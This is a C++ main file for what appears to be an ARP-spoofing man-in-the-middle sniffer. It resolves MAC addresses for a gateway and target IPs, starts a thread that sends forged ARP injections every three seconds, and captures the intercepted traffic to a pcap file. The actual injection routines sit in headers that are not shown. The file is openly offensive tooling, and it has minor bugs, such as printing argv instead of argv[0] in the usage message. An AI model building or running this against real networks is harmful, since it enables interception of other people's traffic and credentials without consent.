#include <iostream>
#include <vector>
#include <string>
#include <atomic>
#include <thread>
#include <csignal>

#include "PacketSniffer.hpp"
#include "PacketHandler.hpp"
#include "Interface.hpp"
#include "CliHelper.hpp"
#include "ArpResolver.hpp"
#include "FriendlyArp.hpp"
#include "NetworkHelper.hpp"


std::atomic<bool> running(true);

void arp_injection_worker(FriendlyArp& friendlyArp, const std::vector<uint32_t>& target_ips);
void inject_and_sniff(const Interface& interface, const std::vector<uint32_t>& target_ips_uint32, const char* filename);
void signal_handler(int signal_num);
bool find_dev(char*& , pcap_if_t*&);

int main(int argc, char* argv[])
{
    std::signal(SIGINT, signal_handler);
    if (argc < 2) 
    {
        std::cerr << "Usage: " << argv << "<output file name> <Gateway IPv4> [IP_1] [IP_2] ... [IP_N]\n";
        std::cout << "IP address format: X.X.X.X\n";
        return 1; 
    }

    char* device;
    pcap_if_t *all_devs;
    std::vector<std::string> target_ips;

    if (!find_dev(device, all_devs))
        return 1;
    
    Interface interface(device);
    try
    {
        interface.open_interface();
    }
    catch(const std::exception& e)
    {
        std::cerr << "[ ERROR ] " << e.what() << '\n';
    }
    
    char* filename = argv[1];
    for (int i = 2; i < argc; i++)
        target_ips.push_back(argv[i]);
    
    std::vector<uint32_t> target_ips_uint32 = CliHelper::build_ip_list(target_ips);

    std::cout << "\nUse Ctrl+C to stop sniffing\n\n";
    
    inject_and_sniff(interface, target_ips_uint32, filename);

    pcap_freealldevs(all_devs);
}

void inject_and_sniff(const Interface& interface, const std::vector<uint32_t>& target_ips_uint32, const char* filename)
{
    ArpResolver arp_resolver(interface.get_pcap_handle(), interface.get_interface_name());
    arp_resolver.build_arp_cache(target_ips_uint32, running);

    MacAddress local_mac;
    uint32_t local_ip;
    uint32_t subnet_mask;

    if (!NetworkHelper::get_local_mac(interface.get_interface_name(), local_mac)) 
    {
        std::cerr << "Failed to get local MAC address." << std::endl;
        return;
    }

    if (!NetworkHelper::get_local_ip_pcap(interface.get_interface_name(), &local_ip)) 
    {
        std::cerr << "Failed to get local IP address." << std::endl;
        return;
    }

    auto it = arp_resolver.get_arp_cache().find(target_ips_uint32[Config::GATEWAY_INDEX]);
    if (it == arp_resolver.get_arp_cache().end()) 
    {
        std::cerr << "Critical Error: Gateway IP MAC address not found in ARP cache!" << std::endl;
        return;
    }

    MacAddress gateway_mac = it->second;
    subnet_mask = NetworkHelper::get_subnet_mask(interface.get_interface_name());

    NetworkContext net_ctx = {
        .local_mac   = local_mac,
        .gateway_mac  = gateway_mac,
        .local_ip    = local_ip,
        .subnet_mask = subnet_mask
    };

    FriendlyArp friendlyArp(arp_resolver.get_arp_cache(),
                            interface.get_pcap_handle(),
                            net_ctx);

    CaptureContext ctx = {
        .arp_forwarder = &friendlyArp,
        .pcap_dumper   = pcap_dump_open(interface.get_pcap_handle(), filename)
    };

    std::thread injection_thread(arp_injection_worker, std::ref(friendlyArp), std::cref(target_ips_uint32));
    std::this_thread::sleep_for(std::chrono::seconds(1));
    
    PacketSniffer sniffer;
    sniffer.start_sniffing(interface.get_pcap_handle(), process_packet, reinterpret_cast<uint8_t*>(&ctx), running);

    std::cout << "\nSniffer stopped. Cleaning up assets...\n";
    if (injection_thread.joinable()) {
        injection_thread.join();
    }

    if (ctx.pcap_dumper != nullptr) {
        pcap_dump_close(ctx.pcap_dumper);
        std::cout << "Saved to " << filename << std::endl;
    }
}

void arp_injection_worker(FriendlyArp& friendlyArp, const std::vector<uint32_t>& target_ips)
{
    while (running)
    {
        friendlyArp.send_arp_injections(target_ips);
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
}

void signal_handler(int signal_num) 
{
    if (signal_num == SIGINT)
    {
        running = false;
    }
}

bool find_dev(char*& device, pcap_if_t*& all_devs)
{
    char error_buffer[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&all_devs, error_buffer) == -1 || all_devs == nullptr) {
        std::cerr << "Failed to find a valid interface." << std::endl;
        return false;
    }

    device = CliHelper::option_get_interface(all_devs, error_buffer);

    if (device == NULL)
    {
        std::cerr << "Error finding device: " << error_buffer << std::endl;
        return false;
    }

    return true;
}